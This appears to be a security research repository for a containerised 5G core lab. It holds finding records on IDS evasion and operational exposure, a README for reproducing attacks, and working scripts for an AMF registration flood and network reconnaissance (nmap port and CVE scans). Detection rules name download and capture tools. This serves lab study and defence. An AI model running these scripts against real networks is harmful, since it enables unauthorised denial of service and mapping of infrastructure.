TR-AI-002,Adversarial evasion of the IDS by scaling a single packet-length feature,AI,AI/ML security of the IDS pipeline,High,Confirmed,"Deployed IDS model, feature set ['proto','ip_len','frame_len']","With white-box access to the trained classifier, the operator took the test set, selected the rows labelled `ICMP_FLOOD`, and multiplied one feature — `ip_len` — by 0.5. Those rows were fed back to the model and an **evasion rate** computed: the fraction of real flood samples now predicted `Benign`. A baseline of `0.75` appears in the later hardening work, implying roughly three in four flood samples evaded detection after a single arithmetic change to one field.","An ICMP flood — and by extension any attack the model is supposed to catch — proceeds while being classified as benign. Because the change is to a field the attacker already controls, there is no trade-off: the attack keeps working at full strength while becoming invisible.",Monitor the distribution of input features at inference time and alert on drift — a sudden population of `ICMP_FLOOD`-shaped flows with halved `ip_len` is anomalous even if the classifier calls them benign. Keep a rule-based detector alongside the model for high-confidence signatures such as ICMP rate per source; a threshold rule is unaffected by this perturbation. Log low-confidence predictions and review clusters of them.,"Adversarial training (which the operator went on to demonstrate — see DETECTION.md §5). Use features the attacker cannot cheaply control — inter-arrival statistics, flow duration, per-source rate — rather than packet length. Ensemble across models with different feature views. Do not expose the deployed model or its parameters to any account that does not need them."
TR-AI-003,Three-feature model provides no adversarial robustness by construction,AI,AI/ML security of the IDS pipeline,High,Confirmed,"IDS feature pipeline preprocess.py, labeled_flows.csv, deployed model","Every model in the pipeline — the clean classifier, the poisoned one, the adversarially-trained ""robust"" one and the RandomForest ensemble — operates on the same three features: `['proto','ip_len','frame_len']`. Two of the three are packet sizes and the third is the IP protocol number. The feature list appears verbatim in three separate prediction calls.","Any attacker who can choose their packet sizes controls the model's output. Worse, because the detector appears to work on the training distribution, it displaces the rate-based detection that would have caught the attack.","Audit the feature set before the model: for every class the model claims to detect, check that at least one feature actually measures the distinguishing behaviour. Here `ICMP_FLOOD` has no rate feature, and that is the finding. Track per-class recall under deliberate perturbation of each feature as a release gate.","Add temporal and volumetric features — packets per second per source, flow duration, inter-arrival mean and variance, unique destinations per source. The CICFlowMeter CSVs already in this dataset provide 84 such features and would have been a far better basis than a three-column `tshark` export. Validate that labels describe behaviour rather than an artefact of how the sample was generated."
TR-AI-004,Unprotected ML training corpus built from live 5G control-plane telemetry,AI,AI/ML security of the IDS pipeline,Medium,Confirmed,"raw_capture.csv, labeled_flows.csv (25 MB), host 10.10.3.20","The IDS training corpus was produced by running `tshark` on the container host — the same capture position that sees every 5G interface (TR-OPS-001) — writing the result to a world-readable CSV, and post-processing it into a 25 MB labelled dataset. Both files sit in the operator's working directory with no access control, no encryption and no integrity protection. The corpus was read repeatedly across two separate capture windows and via a Jupyter notebook.","Provides the write target for TR-AI-001 and a compact, portable summary of all core traffic for an adversary who reaches the host — which TR-VIRT-001 shows is achievable from any privileged container.",Alert on world-readable files in ML working directories. Monitor writes to the training corpus outside the ingest pipeline's own identity. Checksum the corpus before every training run and compare against the signed manifest.,"Store training data in a versioned, access-controlled artefact store with content hashes and signed manifests. Restrict corpus write access to the ingest service account. Encrypt at rest. Minimise fields at extraction time. Separate the training host from the host running production network functions."
TR-OPS-001,Full-fidelity capture position on the container host observes every interface,OPS,Operational security and detection posture,Medium,Confirmed,"Container host 10.10.3.20, all 5G interfaces","`tcpdump -i any` was run on the container host for every one of the eleven exercise modules, each capture bracketed by a start and a `kill -15`. Because the host owns the Docker bridge, `-i any` sees N1/N2, N3, N4, the full service-based interface, the subscriber database and the management network in one stream. The resulting captures total 1.25 M frames in the nine files present here, plus 4.27 M more in the excluded module3.","Complete, retrospective visibility of the 5G core: subscriber identities, device identities, session bindings, tunnel identifiers and long-term keys. Capture files left on disk extend the exposure beyond the session, and TR-VIRT-001 shows how an attacker reaches that disk.","Alert on any process opening an `AF_PACKET` socket on a production host, and on `tcpdump`, `tshark` or `dumpcap` execution outside an approved change window. Alert on capture tooling running *inside* a container — there is no legitimate case for that. Monitor for large `.pcap` files appearing on NF hosts.","Remove packet-capture binaries from production hosts and NF images; where capture is needed, use a controlled TAP or a mirror port feeding an access-controlled collector. Encrypt the interfaces (TR-N2-002, TR-N4-001, TR-SUB-003) so that a capture position yields ciphertext rather than credentials. Restrict `CAP_NET_RAW`. Treat capture files as subscriber-data assets with matching retention, encryption and deletion controls."
TR-OPS-002,Offensive tooling pulled from the public internet onto the core host,OPS,Operational security and detection posture,Medium,Confirmed,"Container host 10.10.3.20, egress path to the internet","The host that runs the 5G core has unrestricted outbound internet access and it was used repeatedly to fetch capability: the 5GReplay binary and its seed capture from GitHub releases, `arp-scan` and `tshark` from distribution repositories, `pandas` and `scikit-learn` from PyPI, and public container images (`gradiant/snseiimm`, `gradiant/55pttolsdeons`) from a registry. Some installs were run from inside network-function containers rather than on the host.","Arbitrary capability can be introduced to the host that terminates every 5G reference point. An attacker with a shell inherits the same path, and runtime package installation inside NF containers means no deployed image can be trusted to match its manifest.","Alert on outbound HTTP/HTTPS from NF hosts to anything outside an approved mirror. Alert on `wget`, `curl`, `apt install` or `pip install` executing on a production NF host or inside a container. Alert on image pulls from registries other than the approved internal one. In this dataset every one of those signals fired and none was acted on.","Default-deny egress from NF hosts, with an allow-list to internal mirrors only. Immutable, read-only container filesystems so runtime installation fails. Image signing with admission-time verification. Remove package managers and download utilities from production images."

threat-repository/rerun-package/README.md
+117
# Re-run package

Scripts to reproduce, with adequate telemetry this time, the four modules whose original
captures were found to be under-evidenced by `paper/GROUND-TRUTH-CROSSCHECK.md`
(modules 2, 4, 5, 6 — see that document's §7 for the full "which modules need a re-run" answer).

**This package targets your own Open5GS + UERANSIM testbed. Nothing here runs in this
workspace** — there is no Docker, no privileged container runtime and no 5G core available in
the sandbox this repository was analysed in. Everything below is written to be handed to the
operator of a real lab (the same lab topology as `ENVIRONMENT.md` describes) and run there.

**Do not point any of this at a network you do not own and do not have written authorisation to
test.** Every script here reproduces a denial-of-service or credential-abuse primitive.

## Why a re-run, and why only these four modules

`paper/GROUND-TRUTH-CROSSCHECK.md` §7 answers this in full; in short:

| Module | Re-run needed? | Reason |
|---|---|---|
| 0, 1, 3, 7, 8, 9 | No | Fully evidenced (0, 1, 3), or correctly host-level and not expected on the wire (7, 8, 9). |
| 2 | **Yes** | The IMSI flood's defining signal (SCTP/NGAP) is *below* the benign baseline in the original capture — 5 flows vs 20–23 (netflow-derived count; see note below). |
| 4 | **Yes** | Zero SCTP/NGAP/GTP-U in the original capture; only the ARP side-effect of the recon scan survived. |
| 5 | **Yes** | Zero SCTP/NGAP/GTP-U; slice-config verification traffic survived, the traffic the slice change was meant to produce did not. |
| 6 | **Yes** | Zero SCTP/NGAP/GTP-U; the largest lab module left no direct evidence of either of its two attacks. |

> **Note on "flow" counts.** The 20/23/5 figures above are from `paper/GROUND-TRUTH-CROSSCHECK.md`
> §6, derived from the `netflows/` CSVs (a timeout-based flow definition). `validate/compare_capture.py`
> instead counts distinct SCTP *associations* directly from a pcap, using the SCTP verification tag
> (there is no netflow-style tool available to this analysis) — a different, smaller, but internally
> consistent metric. Do not expect the two counting methods to agree numerically; both correctly show
> module 2's SCTP activity as flat-to-unchanged rather than flood-scaled, which is the actual finding.

## The six capture fixes (apply to every re-run — `paper/GROUND-TRUTH-CROSSCHECK.md` §7b)

1. **Keep the RAN attached.** Do not tear down and rebuild the gNB/AMF pair mid-capture unless
   that reset is itself the thing you intend to measure — modules 2, 5 and 6 in the original
   dataset all show one-sided ARP storms consistent with exactly this happening incidentally.
2. **Capture from more than one vantage point (`TR-OPS-001`).** Run `capture/start_capture.sh`
   on *every* Docker network involved — in particular slice 2's network
   (`172.19.0.0/16` in the original topology), which the original captures never recorded at all.
3. **Set `HISTTIMEFORMAT` before anything else** (`capture/env_setup.sh`) so bash history carries
   real timestamps — the single biggest reconstruction obstacle in the original dataset was
   timestamp-free shell history.
4. **Capture host telemetry alongside the network**: `docker events`, `docker stats`,
   `dmesg`/`auditd` if available. The container-escape and PFCP-brute-force modules are
   host-local by design; the network capture alone will not evidence them.
5. **Record a benign baseline immediately before each attack run** (`baseline/benign_baseline.sh`)
   in the same topology, so request/reply ratios and PDU/s baselines are measured fresh rather
   than reused from a different lab instance.
6. **Keep the original module 0–9 captures as a control set.** Do not overwrite them. The value
   of this re-run is comparative: "what does the same designed activity look like with adequate
   telemetry" is only meaningful next to "what did it look like without it."

## Contents

```
capture/
  env_setup.sh          -- HISTTIMEFORMAT, shell options, run this first in every terminal
  start_capture.sh       -- multi-vantage tcpdump harness (host bridge + every Docker network)
attacks/
  module02_imsi_flood.sh         -- 1,000-UE (5x200) registration flood against the AMF
  module04_recon.sh              -- passive+active recon: docker, arp-scan, nmap, tshark
  module05_slice_add.sh          -- adds a second NSSAI slice with QoS caps, verifies, load-tests
  module06_pfcp_seid_bruteforce.py  -- PFCP SessionDeletionRequest SEID brute force (raw socket,
                                        stdlib only -- hand-built TS 29.244 wire format, no scapy)
  module06_cross_slice_imsi_spoof.sh -- pivots a UE onto a second slice under an adjacent IMSI
baseline/
  benign_baseline.sh      -- ping/registration-only control run, same duration as an attack run
validate/
  compare_capture.py      -- compares an attack capture against a same-instance benign baseline
                             capture (per-module SCTP/NGAP/GTP-U/PFCP expectations); exits 0 for
                             SUFFICIENT, 1 for INSUFFICIENT
```

## How to use this package

```bash
# 1. On the container host, in every terminal you open:
source capture/env_setup.sh

# 2. Start capture on every network before touching the lab (run once per network, backgrounded):
sudo ./capture/start_capture.sh 172.18.0.0/16 docker0        rerun-module02.pcap &
sudo ./capture/start_capture.sh 172.19.0.0/16 <slice2-bridge> rerun-module02-slice2.pcap &

# 3. Record a benign baseline of the same duration as the attack you are about to reproduce
#    (stop capture, save as e.g. baseline-module02.pcap, restart capture, then continue):
./baseline/benign_baseline.sh 300   # 300 s, tune to match the module's original duration

# 4. Run the attack module, e.g.:
./attacks/module02_imsi_flood.sh

# 5. Stop capture, then validate sufficiency before trusting the result -- this compares the
#    attack capture against the benign baseline from step 3, not against a fixed number:
python3 validate/compare_capture.py rerun-module02.pcap --baseline baseline-module02.pcap --module 2
```

## What "success" looks like

`validate/compare_capture.py` does **not** compare against a hard-coded threshold copied from the
original dataset: the original numbers (e.g. "20-23 SCTP flows") are specific to that lab instance
and are not guaranteed to reproduce exactly on a different instance, timer configuration or subscriber
count. Instead it computes the same metrics (SCTP flow/association count via verification tag,
NGAP/GTP-U packet volume, non-heartbeat PFCP message count) on **both** the attack capture and a
same-instance benign baseline captured immediately before it (step 3 above), and checks that the
attack capture shows the module-appropriate directional change — e.g. for module 2, the number of
distinct SCTP associations must be at or above the baseline's, not below it as in the original
capture (which is exactly the anomaly `paper/GROUND-TRUTH-CROSSCHECK.md` §7 flags). A re-run is
**sufficient** for the telemetry-tiering claims in the paper if the script exits 0 (SUFFICIENT) for
that module's expectations; exit 1 (INSUFFICIENT) means repeat the run with the fixes above.

As a sanity check on the tool itself, running it with the *original* module0.pcap as the baseline
against the original module2/4/5/6 captures reproduces the crosscheck's own conclusions: module 2 is
already SUFFICIENT by NGAP volume (the flood itself is well evidenced), while modules 4, 5 and 6 are
INSUFFICIENT (zero SCTP/NGAP/GTP-U/non-heartbeat-PFCP activity survives in each) -- confirming the
validator's directional checks agree with the manual analysis in `FINDINGS-REPORT.md` before you rely
on it for a fresh re-run.

threat-repository/rerun-package/attacks/module02_imsi_flood.sh

#!/usr/bin/env bash
# module02_imsi_flood.sh -- volumetric registration flood against the AMF (TR-RAN-002).
#
# Original implementation for this re-run package, not a copy of the NITRO lab guide (which is
# third-party copyrighted course material -- see the copyright note in
# paper/GROUND-TRUTH-CROSSCHECK.md). This reproduces the *documented, publicly known* technique
# the guide's title describes ("IMSI flood against the AMF") using UERANSIM's own published CLI
# (`nr-ue -c <config> -n <count>`, which spawns <count> UE instances from one base config,
# incrementing the trailing IMSI digit -- this is stock UERANSIM behaviour, see
# https://github.com/aligungr/UERANSIM) and Open5GS's own subscriber-provisioning CLI
# (`open5gs-dbctl`).
#
# WHY THIS MATTERS FOR THE RE-RUN: the original dataset's module2 capture shows this exact class
# of activity landing *below* a healthy baseline (5 SCTP flows vs 20-23 in modules 0-1) --
# paper/GROUND-TRUTH-CROSSCHECK.md §6a. The working hypothesis is that the gNB/AMF SCTP
# association was not held up throughout the flood. This script deliberately keeps the RAN
# attached for the whole run (capture fix #1) so that hypothesis can be tested.

set -euo pipefail

# ---- configuration -----------------------------------------------------------------------
PLMN_MCC="${PLMN_MCC:-999}"
PLMN_MNC="${PLMN_MNC:-70}"
BASE_KEY="${BASE_KEY:-465B5CE8B199B49FAA5F0A2EE238A6BC}"     # test-only key, do not reuse on real SIMs
BASE_OPC="${BASE_OPC:-E8ED289DEBA952E4283B54E88E6183CA}"     # test-only OPc
GNB_IP="${GNB_IP:?set GNB_IP to the gNB address, e.g. 172.18.0.15}"
UE_PROCESSES="${UE_PROCESSES:-5}"       # parallel nr-ue processes
UES_PER_PROCESS="${UES_PER_PROCESS:-200}"   # -n count per process => 1,000 UEs total by default
REPEAT="${REPEAT:-3}"                    # how many times to repeat the flood, per the original design
BASE_IMSI="${BASE_IMSI:-999700000100000}"   # first IMSI of the flood block; must not collide with real subscribers
WORKDIR="$(mktemp -d /tmp/imsi-flood.XXXXXX)"

echo "module02: workdir=${WORKDIR}"
echo "module02: ${UE_PROCESSES} processes x ${UES_PER_PROCESS} UEs = $((UE_PROCESSES * UES_PER_PROCESS)) UEs per repeat, x${REPEAT} repeats"

cleanup() {
    echo "module02: cleaning up nr-ue processes"
    pkill -f "nr-ue -c ${WORKDIR}" 2>/dev/null || true
}
trap cleanup EXIT

# ---- provision the subscriber block once, up front --------------------------------------
provision_block() {
    echo "module02: provisioning ${UE_PROCESSES}x${UES_PER_PROCESS} test subscribers"
    local i imsi
    for ((i = 0; i < UE_PROCESSES; i++)); do
        imsi=$(printf "%015d" $((BASE_IMSI + i * UES_PER_PROCESS)))
        # open5gs-dbctl add_ue_with_slice <imsi> <key> <opc> <apn> <sst> <sd>
        # nr-ue -n increments the *last* digits of the base IMSI for subsequent instances,
        # so provisioning the first IMSI of each block is sufficient if the deployment's
        # provisioning script also pre-populates the following (UES_PER_PROCESS - 1) IMSIs --
        # adjust this loop to your own provisioning automation if it does not.
        open5gs-dbctl add_ue_with_slice "${imsi}" "${BASE_KEY}" "${BASE_OPC}" internet 1 0x000001 \
            || echo "module02: warning: provisioning ${imsi} failed or already exists"
    done
}

# ---- build one UERANSIM config per parallel process --------------------------------------
write_ue_config() {
    local idx="$1" imsi="$2" cfg="${WORKDIR}/ue-${idx}.yaml"
    cat > "${cfg}" <<YAML
supi: 'imsi-${imsi}'
mcc: '${PLMN_MCC}'
mnc: '${PLMN_MNC}'
protectionScheme: 0
homeNetworkPublicKey: ''
homeNetworkPublicKeyId: 0
routingIndicator: '0000'
key: '${BASE_KEY}'
op: '${BASE_OPC}'
opType: 'OPC'
amf: '8000'
imei: '356938035643803'
imeiSv: '4370816125816151'
gnbSearchList:
  - ${GNB_IP}
uacAic:
  mps: false
  mcs: false
uacAcc:
  normalClass: 0
  class11: false
  class12: false
  class13: false
  class14: false
  class15: false
sessions:
  - type: 'IPv4'
    apn: 'internet'
    slice:
      sst: 1
      sd: 0x000001
configured-nssai:
  - sst: 1
    sd: 0x000001
default-nssai:
  - sst: 1
    sd: 0x000001
integrity:
  IA1: true
  IA2: true
  IA3: true
ciphering:
  EA1: true
  EA2: true
  EA3: true
integrityMaxRate:
  uplink: 'full'
  downlink: 'full'
YAML
    echo "${cfg}"
}

# ---- the flood ------------------------------------------------------------------------------
run_flood_once() {
    local repeat_no="$1" i imsi cfg pid pids=()
    echo "module02: flood repeat ${repeat_no}/${REPEAT} starting at $(date -Is)"
    for ((i = 0; i < UE_PROCESSES; i++)); do
        imsi=$(printf "%015d" $((BASE_IMSI + i * UES_PER_PROCESS)))
        cfg=$(write_ue_config "${i}" "${imsi}")
        # nr-ue's own -n flag spawns <UES_PER_PROCESS> UE instances from this one base config,
        # each with the trailing IMSI digits incremented -- this is UERANSIM's documented
        # behaviour, not a modification we are making to it.
        nr-ue -c "${cfg}" -n "${UES_PER_PROCESS}" &
        pids+=("$!")
        echo "module02:   launched process ${i} (pid $!) for base IMSI ${imsi}"
    done
    echo "module02: all ${UE_PROCESSES} processes launched, pids: ${pids[*]}"
    # Hold the flood up for a fixed dwell time so the SCTP association has to carry sustained
    # load rather than a single burst -- this is the condition capture fix #1 is checking.
    sleep "${DWELL_SECONDS:-120}"
    echo "module02: stopping repeat ${repeat_no}"
    kill "${pids[@]}" 2>/dev/null || true
    wait 2>/dev/null || true
}

main() {
    provision_block
    for ((r = 1; r <= REPEAT; r++)); do
        run_flood_once "${r}"
        if [ "${r}" -lt "${REPEAT}" ]; then
            echo "module02: pausing ${INTER_REPEAT_SLEEP:-10}s between repeats (RAN stays attached -- capture fix #1)"
            sleep "${INTER_REPEAT_SLEEP:-10}"
        fi
    done
    echo "module02: done. Validate with:"
    echo "  python3 ../validate/compare_capture.py <your-capture>.pcap --module 2"
}

main "$@"

threat-repository/rerun-package/attacks/module04_recon.sh

#!/usr/bin/env bash
# module04_recon.sh -- passive + active reconnaissance of the containerised 5G core.
#
# Original implementation reproducing the publicly-documented recon technique class ("map a
# Docker-based 5G core before attacking it": enumerate containers, inspect the bridge network,
# host-discover, port-scan, then correlate with known CVEs) -- not a copy of any third-party
# course material. Every command below is a standard, publicly documented tool invocation
# (docker, nmap, tshark) with no lab-specific secrets embedded.
#
# Run this from the container host (not from inside a container) with capture already running
# on the target bridge (see ../capture/start_capture.sh) -- module 4 in the original dataset
# left only an ARP side-effect (9,958 ARP frames, consistent with the arp-scan phase of this
# recon) and zero SCTP/NGAP/GTP-U, so this re-run exists specifically to confirm whether a
# *complete* recon pass (through to the tshark/NGAP inspection step) produces additional
# corroborating signal that a partial one did not.

set -euo pipefail
OUTDIR="${OUTDIR:-./module04-recon-$(date +%s)}"
mkdir -p "${OUTDIR}"

log() { echo "[$(date -Is)] $*" | tee -a "${OUTDIR}/recon.log"; }

log "step 1: enumerate running containers (passive)"
docker ps --format 'table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}' | tee "${OUTDIR}/docker-ps.txt"

log "step 2: inspect the target bridge network(s)"
for net in $(docker network ls --format '{{.Name}}'); do
    docker network inspect "${net}" > "${OUTDIR}/network-${net}.json" 2>/dev/null || true
done
log "  wrote network-*.json for $(docker network ls -q | wc -l) networks"

log "step 3: derive subnets from the inspected networks and host-discover on each"
python3 - "${OUTDIR}" <<'PYEOF'
import json, glob, subprocess, sys, os
outdir = sys.argv[1]
subnets = set()
for f in glob.glob(os.path.join(outdir, "network-*.json")):
    try:
        data = json.load(open(f))[0]
        for cfg in data.get("IPAM", {}).get("Config", []):
            if "Subnet" in cfg:
                subnets.add(cfg["Subnet"])
    except Exception:
        pass
print("discovered subnets:", subnets)
for s in subnets:
    out = os.path.join(outdir, f"nmap-sn-{s.replace('/', '_')}.txt")
    try:
        subprocess.run(["nmap", "-sn", s], stdout=open(out, "w"), stderr=subprocess.STDOUT, timeout=120)
    except Exception as e:
        print("nmap host-discovery failed for", s, ":", e)
PYEOF

log "step 4: full port scan + version detection on discovered hosts (adjust target list as needed)"
if [ -n "${TARGETS:-}" ]; then
    for t in ${TARGETS}; do
        nmap -p- -sV "${t}" -oN "${OUTDIR}/nmap-full-${t}.txt" || true
    done
else
    log "  set TARGETS='172.18.0.14 172.18.0.12 ...' to run full port scans; skipped for now"
fi

log "step 5: CVE correlation via nmap vulners script (requires the vulners NSE script)"
if [ -n "${TARGETS:-}" ] && nmap --script-help vulners >/dev/null 2>&1; then
    for t in ${TARGETS}; do
        nmap -sV --script vulners "${t}" -oN "${OUTDIR}/nmap-vulners-${t}.txt" || true
    done
fi

log "step 6: passive NGAP capture sample (N2 traffic pattern discovery)"
if command -v tshark >/dev/null 2>&1; then
    timeout 30 tshark -i any -f "sctp port 38412" -c 50 -w "${OUTDIR}/ngap-sample.pcap" || true
fi

log "recon complete, artefacts in ${OUTDIR}"
log "validate with: python3 ../validate/compare_capture.py <capture-from-start_capture.sh>.pcap --module 4"

threat-repository/rerun-package/attacks/module05_slice_add.sh

#!/usr/bin/env bash
# module05_slice_add.sh -- add a second network slice (NSSAI) with QoS caps and verify it.
#
# Original implementation of the generic, publicly-documented Open5GS slicing procedure
# (edit smf.yaml/amf.yaml NSSAI blocks, add a matching subscriber slice via the provisioning
# CLI, restart, verify, load-test) -- not a copy of any third-party course material. This is
# deliberately NOT an attack script: module 5 in the original dataset is benign lab
# configuration work. It is included in this package because TR-DB-002 was downgraded from an
# "attack" finding to an "indistinguishable from legitimate operations" finding specifically
# because this class of activity (subscriber verification via official tooling) is what module 5
# actually does -- re-running it with full telemetry is how you would confirm or refute that.
#
# Capture fix #1 (keep the RAN attached) matters here too: the original dataset's module5 shows
# a 6,132:0 ARP asymmetry consistent with the guide's own directed `docker compose down` /
# `docker compose up -d` restart cycle -- confirm this re-run reproduces the same signature
# under full multi-vantage capture, rather than the previous single-vantage blind spot.

set -euo pipefail
COMPOSE_DIR="${COMPOSE_DIR:?set COMPOSE_DIR to your open5gs-and-ueransim docker-compose directory}"
SMF_CONFIG="${SMF_CONFIG:-${COMPOSE_DIR}/config/open5gs/smf.yaml}"
AMF_CONFIG="${AMF_CONFIG:-${COMPOSE_DIR}/config/open5gs/amf.yaml}"
NEW_SST="${NEW_SST:-2}"
NEW_SD="${NEW_SD:-000002}"
NEW_DNN="${NEW_DNN:-lowlatency}"
SUBSCRIBER_IMSI="${SUBSCRIBER_IMSI:?set SUBSCRIBER_IMSI to an already-provisioned test subscriber}"

log() { echo "[$(date -Is)] $*"; }

log "step 1: stop the core for a clean config apply (capture stays running throughout)"
( cd "${COMPOSE_DIR}" && docker compose down )

log "step 2: patch smf.yaml with the new slice + QoS caps"
python3 - "${SMF_CONFIG}" "${NEW_SST}" "${NEW_SD}" "${NEW_DNN}" <<'PYEOF'
import sys, yaml
path, sst, sd, dnn = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
with open(path) as f:
    cfg = yaml.safe_load(f)
smf_info = cfg.setdefault("smf", {}).setdefault("info", [])
smf_info.append({
    "s_nssai": [{"sst": sst, "sd": sd}],
    "dnn": [{
        "name": dnn,
        "qos": {
            "default": {
                "5qi": 9,
                "arp": {"priority_level": 8},
                "mbr": {"downlink": 10_000_000, "uplink": 5_000_000},
                "gbr": {"downlink": 5_000_000, "uplink": 2_000_000},
            }
        },
    }],
})
with open(path, "w") as f:
    yaml.safe_dump(cfg, f, sort_keys=False)
print(f"patched {path}: added sst={sst} sd={sd} dnn={dnn}")
PYEOF

log "step 3: patch amf.yaml so the AMF advertises the new slice"
python3 - "${AMF_CONFIG}" "${NEW_SST}" "${NEW_SD}" <<'PYEOF'
import sys, yaml
path, sst, sd = sys.argv[1], int(sys.argv[2]), sys.argv[3]
with open(path) as f:
    cfg = yaml.safe_load(f)
plmn_support = cfg.get("amf", {}).get("plmn_support", [])
for entry in plmn_support:
    entry.setdefault("s_nssai", []).append({"sst": sst, "sd": sd})
with open(path, "w") as f:
    yaml.safe_dump(cfg, f, sort_keys=False)
print(f"patched {path}: AMF now advertises sst={sst} sd={sd}")
PYEOF

log "step 4: grant the test subscriber the new slice via the official provisioning CLI"
open5gs-dbctl add_ue_with_slice "${SUBSCRIBER_IMSI}" "$(open5gs-dbctl showfiltered | grep -A2 "${SUBSCRIBER_IMSI}" | grep -oP '(?<=k: )\S+')" \
    "$(open5gs-dbctl showfiltered | grep -A2 "${SUBSCRIBER_IMSI}" | grep -oP '(?<=opc: )\S+')" \
    "${NEW_DNN}" "${NEW_SST}" "0x${NEW_SD}" \
    || log "  warning: automatic re-provisioning failed -- add the slice via the WebUI instead and continue"

log "step 5: bring the core back up"
( cd "${COMPOSE_DIR}" && docker compose up -d )
sleep 15

log "step 6: verify the slice was loaded"
docker logs "$(docker ps --format '{{.Names}}' | grep -m1 smf)" 2>&1 | grep -i qos || log "  no QoS line found in SMF logs yet -- check timing"
open5gs-dbctl showpretty "${SUBSCRIBER_IMSI}"

log "step 7: load-test both slices from the UE container (adjust interface names to your session)"
log "  run inside the UE container:"
log "    iperf3 -c 8.8.8.8 -R -t 30 -i uesimtun0   # slice 1, uncapped"
log "    iperf3 -c 8.8.8.8 -R -t 30 -i uesimtun1   # slice 2, capped at 10 Mbps downlink"

log "done. validate with: python3 ../validate/compare_capture.py <capture>.pcap --module 5"

threat-repository/rerun-package/attacks/module06_cross_slice_imsi_spoof.sh
